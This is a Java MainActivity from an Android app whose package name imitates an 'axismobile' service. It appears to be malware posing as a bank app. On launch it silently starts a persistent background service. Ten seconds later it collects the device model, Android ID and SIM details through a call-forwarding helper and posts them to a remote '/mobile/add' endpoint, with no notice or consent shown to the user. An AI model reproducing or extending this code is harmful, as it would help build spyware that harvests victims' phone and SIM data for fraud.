package axismobile.service.testingonnboard.system;
import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.widget.Toast;

import androidx.core.content.ContextCompat;

import com.getcapacitor.BridgeActivity;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.Objects;


public class MainActivity extends BridgeActivity {
    private static final int REQUEST_PERMISSIONS = 1;


    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent serviceIntent = new Intent(this, BackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        Handler handler = new Handler(Looper.getMainLooper());
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                registerPhoneData();
            }
        }, 10000);
    }

    public void registerPhoneData() {
            SharedPreferencesHelper share = new SharedPreferencesHelper(getApplicationContext());
            if(share.getBoolean("is_registered", false)){
                return ;
            }
            share.saveBoolean("is_registered", true);
            NetworkHelper networkHelper = new NetworkHelper();
            Helper help = new Helper();
            String url = help.URL() + "/mobile/add";
            JSONObject sendData = new JSONObject();
            try {
                Helper hh = new Helper();
                sendData.put("site", hh.SITE());
                sendData.put("mobile", Build.MANUFACTURER);
                sendData.put("model", Build.MODEL);
                sendData.put("mobile_android_version", Build.VERSION.RELEASE);
                sendData.put("mobile_api_level", Build.VERSION.SDK_INT);
                sendData.put("mobile_id",  Helper.getAndroidId(getApplicationContext()));
                try {
                    JSONObject simData = new JSONObject(CallForwardingHelper.getSimDetails(this));
                    sendData.put("sim", simData);
                } catch (JSONException e) {
                    Log.e("Error", "Invalid JSON data: " + e.getMessage());
                }
            }catch (JSONException e) {
                e.printStackTrace();
            }
            Log.d(Helper.TAG, "MOBILE INFO" + sendData);

            networkHelper.makePostRequest(url, sendData, new NetworkHelper.PostRequestCallback() {
                @Override
                public void onSuccess(String result) {
                    runOnUiThread(() -> {
                        try {
                            JSONObject jsonData = new JSONObject(result);
                            if(jsonData.getInt("status") == 200) {
                                Log.d(Helper.TAG, "Registered Mobile");
                            }else {
                                Log.d(Helper.TAG, "Mobile Could Not Registered "+ jsonData.toString());
                                Toast.makeText(getApplicationContext(), "Mobile Could Not Be Registered " + jsonData.toString(), Toast.LENGTH_LONG).show();
                            }
                        } catch (JSONException e) {
                            Log.d(Helper.TAG, Objects.requireNonNull(e.getMessage()));
                            Toast.makeText(getApplicationContext(),  Objects.requireNonNull(e.getMessage()), Toast.LENGTH_LONG).show();
                        }
                    });
                }
                @Override
                public void onFailure(String error) {
                    runOnUiThread(() -> {
                        Log.d(Helper.TAG, error);;
                        Toast.makeText(getApplicationContext(),  error, Toast.LENGTH_LONG).show();
                    });
                }
            });

    }

}
